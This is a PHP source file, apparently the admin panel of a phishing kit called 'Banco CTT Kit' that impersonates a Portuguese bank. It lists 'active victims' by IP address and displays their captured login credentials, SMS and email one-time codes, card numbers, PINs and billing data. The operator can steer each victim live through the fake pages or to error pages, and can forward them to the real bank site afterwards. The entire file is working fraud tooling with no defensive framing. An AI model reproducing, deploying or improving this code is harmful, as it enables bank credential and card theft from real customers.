<?php
// ============================================================
//  admin.php — Per-IP control panel (no password)
//  Updated: includes 'approve' + 'emailotp' steps
//  URL: admin.php                    (lists all active victims)
//       admin.php?ip=<ip>            (controls a specific victim)
//       admin.php?ip=<ip>&action=go&destination=approve.php
//       admin.php?ip=<ip>&action=go&destination=error:approve
//       admin.php?ip=<ip>&action=wait
//  
// ============================================================
require_once 'config.php';

$method = $_SERVER['REQUEST_METHOD'];
$ip     = isset($_REQUEST['ip']) ? preg_replace('/[^0-9a-fA-F:\.\-]/', '', $_REQUEST['ip']) : null;

// --- POST / GET handler for actions on a specific victim ----
if ($ip && ($method === 'POST' || isset($_REQUEST['action']))) {
    handle_action($ip);
    exit;
}

// --- Otherwise render UI ------------------------------------
header('Content-Type: text/html; charset=utf-8');
header('Cache-Control: no-store');

// All steps including approve + emailotp
$STEPS = array('login', 'sms', 'emailotp', 'approve', 'card', 'pin', 'billing');
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Banco CTT Kit — Admin Panel</title>
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
body{font-family:"Segoe UI",Tahoma,Helvetica,Arial,sans-serif;background:#0f1419;color:#d8d8d8;font-size:13px;line-height:1.5}
.wrap{max-width:1280px;margin:0 auto;padding:18px}
header{display:flex;align-items:center;justify-content:space-between;padding:14px 18px;background:linear-gradient(180deg,#1c242c,#0f1419);border-bottom:1px solid #2a3540;border-radius:6px;margin-bottom:18px}
header h1{font-size:16px;color:#df0024;letter-spacing:0.5px}
header .meta{font-size:11px;color:#7a8893}
.panel{background:#1a2128;border:1px solid #2a3540;border-radius:6px;margin-bottom:18px;overflow:hidden}
.panel-head{padding:12px 16px;background:#222c35;border-bottom:1px solid #2a3540;display:flex;align-items:center;justify-content:space-between}
.panel-head h2{font-size:13px;color:#df0024;text-transform:uppercase;letter-spacing:0.5px}
.panel-body{padding:16px}
table{width:100%;border-collapse:collapse;font-size:12px}
th,td{padding:8px 10px;text-align:left;border-bottom:1px solid #232b34}
th{color:#7a8893;font-weight:600;text-transform:uppercase;font-size:10px;letter-spacing:0.4px;background:#161c22}
tr:hover td{background:#161c22}
td.ip{font-family:Consolas,monospace;color:#df0024}
td .pill{display:inline-block;padding:2px 7px;border-radius:3px;font-size:10px;font-weight:600;text-transform:uppercase;letter-spacing:0.3px}
.pill-step-login   {background:#1e3a5f;color:#5fa8e8}
.pill-step-sms     {background:#1e5f3a;color:#5fe88a}
.pill-step-emailotp {background:#1e3a5f;color:#5fa8e8}
.pill-step-approve {background:#5f1e5f;color:#e85fd8}
.pill-step-card    {background:#5f3a1e;color:#e8a85f}
.pill-step-pin     {background:#5f1e3a;color:#e85f8a}
.pill-step-billing {background:#3a1e5f;color:#a85fe8}
.pill-step-loading {background:#3a3a3a;color:#aaa}
.pill-step-done    {background:#2a2a2a;color:#7a8893}
.pill-action-go    {background:#0e4d2a;color:#5fe88a}
.pill-action-wait  {background:#3a3a3a;color:#aaa}
.pill-action-done  {background:#2a2a2a;color:#7a8893}
.empty{text-align:center;color:#7a8893;padding:30px;font-style:italic;font-size:12px}
.btn{display:inline-block;padding:5px 10px;border:1px solid #3a4651;background:#222c35;color:#d8d8d8;border-radius:3px;font-size:11px;font-weight:600;cursor:pointer;text-decoration:none;font-family:inherit;transition:all 0.12s}
.btn:hover{background:#2a3540;border-color:#df0024;color:#df0024}
.btn-go{background:#0e4d2a;border-color:#1e7a4a;color:#5fe88a}
.btn-go:hover{background:#1e7a4a;color:#fff}
.btn-warn{background:#5f3a1e;border-color:#8a5a2e;color:#e8a85f}
.btn-warn:hover{background:#8a5a2e;color:#fff}
.btn-err{background:#5f1e1e;border-color:#8a2e2e;color:#e85f5f}
.btn-err:hover{background:#8a2e2e;color:#fff}
.btn-bad{background:#3a1e2a;border-color:#5a2e3a;color:#e85fa8}
.btn-bad:hover{background:#5a2e3a;color:#fff}
.btn-sm{padding:3px 7px;font-size:10px}
.btn-group{display:flex;flex-wrap:wrap;gap:5px}
.form-row{display:flex;gap:8px;align-items:center;margin-top:8px;flex-wrap:wrap}
input[type=text],input[type=url],input[type=number]{background:#0f1419;border:1px solid #2a3540;color:#d8d8d8;padding:6px 9px;border-radius:3px;font-family:Consolas,monospace;font-size:12px;flex:1;min-width:160px}
input:focus{outline:none;border-color:#df0024}
label{font-size:11px;color:#7a8893;text-transform:uppercase;letter-spacing:0.3px;display:block;margin-bottom:4px}
.section-title{font-size:11px;color:#7a8893;text-transform:uppercase;letter-spacing:0.5px;margin:14px 0 6px;padding-bottom:4px;border-bottom:1px solid #232b34}
.victim-detail{background:#1a2128;border:1px solid #2a3540;border-radius:6px;padding:18px;margin-bottom:18px}
.victim-detail h2{color:#df0024;font-size:15px;margin-bottom:8px}
.kv{display:grid;grid-template-columns:140px 1fr;gap:6px 14px;font-size:12px;margin:8px 0}
.kv .k{color:#7a8893}
.kv .v{color:#d8d8d8;font-family:Consolas,monospace;word-break:break-all}
.data-block{background:#0f1419;border:1px solid #232b34;border-radius:4px;padding:10px;margin:8px 0;font-family:Consolas,monospace;font-size:11px;color:#aab}
.data-block pre{margin:0;white-space:pre-wrap;word-break:break-all}
.capture-list{max-height:200px;overflow-y:auto;background:#0f1419;border:1px solid #232b34;border-radius:3px;padding:8px;font-family:Consolas,monospace;font-size:11px}
.capture-list .entry{padding:4px 0;border-bottom:1px solid #1a2128;color:#aab}
.capture-list .entry:last-child{border-bottom:none}
.capture-list .ts{color:#7a8893}
.capture-list .step{color:#df0024;font-weight:700}
a.link{color:#df0024;text-decoration:none}
a.link:hover{text-decoration:underline}
.actions-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(160px,1fr));gap:6px;margin:10px 0}
.actions-grid .btn{width:100%;text-align:center}
.top-tabs{display:flex;gap:6px;margin-bottom:14px;flex-wrap:wrap}
.top-tabs a{padding:7px 12px;background:#1a2128;border:1px solid #2a3540;border-radius:3px;color:#7a8893;font-size:12px;text-decoration:none;font-weight:600;text-transform:uppercase;letter-spacing:0.3px}
.top-tabs a.active{background:#df0024;color:#ffffff;border-color:#df0024}
.msg-bar{padding:10px 14px;border-radius:4px;margin-top:10px;font-size:12px}
.msg-bar.ok{background:#0e4d2a;color:#5fe88a}
.msg-bar.err{background:#5f1e1e;color:#e85f5f}
@media(max-width:700px){
    .actions-grid{grid-template-columns:1fr 1fr}
    .kv{grid-template-columns:1fr}
    .kv .k{color:#df0024}
}
</style>
</head>
<body>
<div class="wrap">
<header>
    <h1>⚙ BANCO CTT KIT — ADMIN PANEL</h1>
    <div class="meta"><?php echo date('Y-m-d H:i:s'); ?> · <?php echo count_active_victims(); ?> active victim(s)</div>
</header>

<?php if ($ip): ?>
    <!-- ============== PER-VICTIM CONTROL ============== -->
    <div class="top-tabs">
        <a href="admin.php">← Back to all victims</a>
        <a href="admin.php?ip=<?php echo urlencode($ip); ?>" class="active">Control: <?php echo htmlspecialchars($ip); ?></a>
    </div>

    <?php render_victim_detail($ip, $STEPS); ?>

<?php else: ?>
    <!-- ============== VICTIM LIST ============== -->
    <div class="top-tabs">
        <a href="admin.php" class="active">Active Victims</a>
        <a href="admin.php?view=captures">Recent Captures</a>
        <a href="admin.php?view=redirects">IP Redirects</a>
    </div>

    <?php
    if (isset($_GET['view']) && $_GET['view'] === 'captures') {
        render_captures_log();
    } elseif (isset($_GET['view']) && $_GET['view'] === 'redirects') {
        render_ip_redirects_panel();
    } else {
        render_victim_list($STEPS);
    }
    ?>
<?php endif; ?>

</div>
</body>
</html>
<?php
// ============================================================
//  Action handler
// ============================================================
function handle_action($ip) {
    $state = get_state($ip);
    if (!$state) $state = init_state($ip, 'login');

    $action = isset($_REQUEST['action']) ? $_REQUEST['action'] : '';

    if ($action === 'wait') {
        $state['action'] = 'wait';
        $state['destination'] = null;
        save_state($ip, $state);
        redirect_back($ip, 'Action set to WAIT');
        return;
    }

    if ($action === 'go') {
        $dest = isset($_REQUEST['destination']) ? $_REQUEST['destination'] : '';
        if (empty($dest)) {
            redirect_back($ip, 'Missing destination', true);
            return;
        }
        $state['action'] = 'go';
        $state['destination'] = $dest;
        save_state($ip, $state);
        redirect_back($ip, 'Routed to: ' . $dest);
        return;
    }

    if ($action === 'redirect_set') {
        $url = isset($_REQUEST['url']) ? $_REQUEST['url'] : '';
        $delay = isset($_REQUEST['delay']) ? (int)$_REQUEST['delay'] : 0;
        $enabled = isset($_REQUEST['enabled']) ? ($_REQUEST['enabled'] == '1') : true;
        if ($enabled && empty($url)) {
            redirect_back($ip, 'URL required when enabling redirect', true);
            return;
        }
        set_ip_redirect($ip, $url, $delay, $enabled);
        redirect_back($ip, 'IP redirect saved');
        return;
    }

    if ($action === 'redirect_disable') {
        disable_ip_redirect($ip);
        redirect_back($ip, 'IP redirect disabled');
        return;
    }

    if ($action === 'reset') {
        init_state($ip, 'login');
        redirect_back($ip, 'Victim state reset to login');
        return;
    }

    if ($action === 'delete') {
        delete_state($ip);
        redirect('admin.php', 'Victim deleted');
        return;
    }

    redirect_back($ip, 'Unknown action', true);
}

function redirect_back($ip, $msg, $isError = false) {
    $ref = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'admin.php?ip=' . urlencode($ip);
    // Strip old msg params
    $ref = preg_replace('/[&?]msg=[^&]*/', '', $ref);
    $ref = preg_replace('/[&?]err=[^&]*/', '', $ref);
    $sep = (strpos($ref, '?') === false) ? '?' : '&';
    $url = $ref . $sep . 'msg=' . urlencode($msg) . ($isError ? '&err=1' : '');
    redirect($url, $msg);
}

function redirect($url, $msg = '') {
    if (strpos($url, 'msg=') === false && $msg !== '') {
        $sep = (strpos($url, '?') === false) ? '?' : '&';
        $url .= $sep . 'msg=' . urlencode($msg);
    }
    header('Location: ' . $url);
    exit;
}

// ============================================================
//  Renders
// ============================================================
function render_victim_list($steps) {
    $victims = get_all_states();
    if (empty($victims)) {
        echo '<div class="panel"><div class="empty">No active victims yet. Wait for a hit…</div></div>';
        return;
    }
    echo '<div class="panel"><div class="panel-head"><h2>Active Victims</h2><span style="font-size:11px;color:#7a8893">' . count($victims) . ' total</span></div><div class="panel-body" style="padding:0">';
    echo '<table><thead><tr><th>IP</th><th>Current Step</th><th>Last Action</th><th>Completed</th><th>Last Seen</th><th>Action</th></tr></thead><tbody>';
    foreach ($victims as $vip => $state) {
        $step = isset($state['current_step']) ? $state['current_step'] : '?';
        $action = isset($state['action']) ? $state['action'] : 'wait';
        $completed = isset($state['completed']) ? $state['completed'] : array();
        $last = isset($state['last_seen']) ? $state['last_seen'] : '-';
        $completedLabels = array();
        foreach ($completed as $k => $v) { if ($v) $completedLabels[] = $k; }
        $completedStr = empty($completedLabels) ? '—' : implode(', ', $completedLabels);
        echo '<tr>';
        echo '<td class="ip"><a class="link" href="admin.php?ip=' . urlencode($vip) . '">' . htmlspecialchars($vip) . '</a></td>';
        echo '<td><span class="pill pill-step-' . htmlspecialchars($step) . '">' . htmlspecialchars($step) . '</span></td>';
        echo '<td><span class="pill pill-action-' . htmlspecialchars($action) . '">' . htmlspecialchars($action) . '</span></td>';
        echo '<td style="font-size:11px;color:#7a8893">' . htmlspecialchars($completedStr) . '</td>';
        echo '<td style="font-size:11px;color:#7a8893;font-family:Consolas,monospace">' . htmlspecialchars($last) . '</td>';
        echo '<td><a class="btn btn-sm btn-go" href="admin.php?ip=' . urlencode($vip) . '">Control →</a></td>';
        echo '</tr>';
    }
    echo '</tbody></table></div></div>';
    render_msg_bar();
}

function render_victim_detail($ip, $steps) {
    $state = get_state($ip);
    if (!$state) {
        echo '<div class="panel"><div class="empty">No state for this IP. <a class="link" href="admin.php">← Back</a></div></div>';
        return;
    }
    $redirects = get_ip_redirects();
    $r = isset($redirects[$ip]) ? $redirects[$ip] : null;

    echo '<div class="victim-detail">';
    echo '<h2>Victim: ' . htmlspecialchars($ip) . '</h2>';

    echo '<div class="kv">';
    echo '<div class="k">Current step</div><div class="v"><span class="pill pill-step-' . htmlspecialchars($state['current_step'] ?? '?') . '">' . htmlspecialchars($state['current_step'] ?? '?') . '</span></div>';
    echo '<div class="k">Action</div><div class="v"><span class="pill pill-action-' . htmlspecialchars($state['action'] ?? 'wait') . '">' . htmlspecialchars($state['action'] ?? 'wait') . '</span></div>';
    echo '<div class="k">Destination</div><div class="v">' . htmlspecialchars($state['destination'] ?? '—') . '</div>';
    echo '<div class="k">Started</div><div class="v">' . htmlspecialchars($state['started_at'] ?? '—') . '</div>';
    echo '<div class="k">Last seen</div><div class="v">' . htmlspecialchars($state['last_seen'] ?? '—') . '</div>';
    $completedList = array_keys(array_filter($state['completed'] ?? array(), function($v){return $v;}));
    echo '<div class="k">Completed steps</div><div class="v">' . htmlspecialchars(implode(', ', $completedList)) . '</div>';
    echo '</div>';

    // Show captured data
    if (!empty($state['data'])) {
        echo '<div class="section-title">Captured Data</div>';
        foreach ($state['data'] as $stepName => $data) {
            echo '<div class="data-block"><strong style="color:#df0024">' . htmlspecialchars(ucfirst($stepName)) . '</strong><pre>' . htmlspecialchars(json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE)) . '</pre></div>';
        }
    }

    // Panel link
    $panelLink = PANEL_BASE_URL . '/admin.php?ip=' . urlencode($ip);
    echo '<div class="section-title">Panel Link (Telegram)</div>';
    echo '<div class="data-block" style="word-break:break-all"><a class="link" href="' . htmlspecialchars($panelLink) . '">' . htmlspecialchars($panelLink) . '</a></div>';

    // Per-step routing buttons (includes approve)
    echo '<div class="section-title">Route victim to a step</div>';
    echo '<div class="actions-grid">';
    foreach ($steps as $s) {
        echo '<a class="btn btn-go" href="admin.php?ip=' . urlencode($ip) . '&action=go&destination=' . urlencode($s . '.php') . '">' . strtoupper($s) . ' → page</a>';
    }
    echo '</div>';

    echo '<div class="section-title">Send to error page</div>';
    echo '<div class="actions-grid">';
    foreach ($steps as $s) {
        echo '<a class="btn btn-err" href="admin.php?ip=' . urlencode($ip) . '&action=go&destination=' . urlencode('error:' . $s) . '">' . strtoupper($s) . ' → error</a>';
    }
    echo '</div>';

    // Custom destination
    echo '<div class="section-title">Custom destination</div>';
    echo '<form method="get" action="admin.php" class="form-row">';
    echo '<input type="hidden" name="ip" value="' . htmlspecialchars($ip) . '">';
    echo '<input type="hidden" name="action" value="go">';
    echo '<input type="text" name="destination" placeholder="approve.php / card.php / error:sms / https://google.com" required>';
    echo '<button type="submit" class="btn btn-go">GO →</button>';
    echo '</form>';

    // Control buttons
    echo '<div class="section-title">Control</div>';
    echo '<div class="actions-grid">';
    echo '<a class="btn btn-warn" href="admin.php?ip=' . urlencode($ip) . '&action=wait">Pause (wait)</a>';
    echo '<a class="btn" href="admin.php?ip=' . urlencode($ip) . '&action=reset">Reset to login</a>';
    echo '<a class="btn btn-bad" href="admin.php?ip=' . urlencode($ip) . '&action=delete" onclick="return confirm(\'Delete this victim?\');">Delete</a>';
    echo '</div>';

    // IP redirect override
    echo '<div class="section-title">IP Redirect Override (post-flow)</div>';
    echo '<p style="font-size:11px;color:#7a8893;margin:4px 0 8px">When this victim finishes the flow, they will be auto-redirected to this URL.</p>';
    echo '<form method="get" action="admin.php" class="form-row">';
    echo '<input type="hidden" name="ip" value="' . htmlspecialchars($ip) . '">';
    echo '<input type="hidden" name="action" value="redirect_set">';
    echo '<input type="url" name="url" placeholder="https://real-bancoctt-login.com" value="' . htmlspecialchars($r['url'] ?? '') . '">';
    echo '<input type="number" name="delay" min="0" max="60" placeholder="delay (s)" value="' . htmlspecialchars($r['delay'] ?? 0) . '" style="max-width:110px">';
    echo '<button type="submit" class="btn btn-go">Save</button>';
    echo '</form>';
    if ($r && !empty($r['url'])) {
        echo '<div style="margin-top:6px;font-size:11px;color:#7a8893">Active: ' . htmlspecialchars($r['url']) . ' (delay ' . (int)$r['delay'] . 's) — <a class="link" href="admin.php?ip=' . urlencode($ip) . '&action=redirect_disable">disable</a></div>';
    }

    echo '</div>';
    render_msg_bar();
}

function render_captures_log() {
    echo '<div class="panel"><div class="panel-head"><h2>Recent Captures Log</h2><a class="btn btn-sm" href="admin.php">← Back</a></div><div class="panel-body">';
    if (!file_exists(CAPTURES_FILE)) {
        echo '<div class="empty">No captures yet.</div></div></div>';
        return;
    }
    $lines = file(CAPTURES_FILE, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    $lines = array_reverse($lines);
    $lines = array_slice($lines, 0, 200);
    echo '<div class="capture-list">';
    foreach ($lines as $line) {
        echo '<div class="entry">' . htmlspecialchars($line) . '</div>';
    }
    echo '</div></div></div>';
}

function render_ip_redirects_panel() {
    $redirects = get_ip_redirects();
    echo '<div class="panel"><div class="panel-head"><h2>IP Redirects</h2><a class="btn btn-sm" href="admin.php">← Back</a></div><div class="panel-body" style="padding:0">';
    if (empty($redirects)) {
        echo '<div class="empty">No IP redirects configured.</div></div></div>';
        return;
    }
    echo '<table><thead><tr><th>IP</th><th>URL</th><th>Delay</th><th>Enabled</th><th>Action</th></tr></thead><tbody>';
    foreach ($redirects as $vip => $r) {
        echo '<tr>';
        echo '<td class="ip"><a class="link" href="admin.php?ip=' . urlencode($vip) . '">' . htmlspecialchars($vip) . '</a></td>';
        echo '<td style="font-family:Consolas,monospace;word-break:break-all">' . htmlspecialchars($r['url'] ?? '') . '</td>';
        echo '<td>' . (int)($r['delay'] ?? 0) . 's</td>';
        echo '<td>' . (!empty($r['enabled']) ? '✓' : '✗') . '</td>';
        echo '<td><a class="btn btn-sm btn-bad" href="admin.php?ip=' . urlencode($vip) . '&action=redirect_disable">Disable</a></td>';
        echo '</tr>';
    }
    echo '</tbody></table></div></div>';
}

function render_msg_bar() {
    if (isset($_GET['msg'])) {
        $isErr = isset($_GET['err']);
        echo '<div class="msg-bar ' . ($isErr ? 'err' : 'ok') . '">' . htmlspecialchars($_GET['msg']) . '</div>';
    }
}
?>